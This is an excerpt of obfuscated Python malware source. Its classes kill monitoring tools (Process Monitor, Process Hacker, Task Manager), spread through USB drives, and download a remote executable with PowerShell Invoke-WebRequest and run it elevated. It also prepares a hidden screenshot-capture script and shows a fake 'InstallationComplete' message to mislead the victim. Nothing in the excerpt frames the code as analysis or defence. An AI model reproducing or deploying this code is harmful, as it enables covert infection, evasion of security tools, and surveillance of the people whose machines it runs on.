...
class AntiAnalysis:
    ...
    def MonitorKill(self):
        XaWyjqOpBdJsaywqZxVv("PowerShell stop-process -Name ProcMon64; stop-process -Name ProcessHacker; Stop-Process -Name Taskmgr", shell=True)
...
class UsbDropper:
    def __init__(self):
        ...
        self.CURRENTHOMEDRIVE = environ["HomeDrive"]
        self.CURRENTSYSTEMDRIVE = environ["SystemDrive"]
        self.MYCURRENTLOCATION = path.basename(argv[0])
...
class FileDownloader:
    ...
    def Dropper(self):
        XaWyjqOpBdJsaywqZxVv("PowerShell Invoke-Webrequest " + self.Url + " -OutFile " + self.DownloadPath + "\\" + self.ExecutableName, shell=True)
    
    def Executor(self):
        XaWyjqOpBdJsaywqZxVv("powershell.exe Start-Process " + self.DownloadPath + "\\" + self.ExecutableName + " -Verb runAs", shell=True)

def ScreenShotter():
    mkdir(environ['temp'] + "\\.0193\\ScreenGrabs")
    with open(environ['temp'] + "\\.0193\\ScreenGrabs\\ScreenShotter.ps1", "w") as ScreenShotter:
        pass
...
windll.user32.MessageBoxW(0, "InstallationComplete", "Info", 0x40)
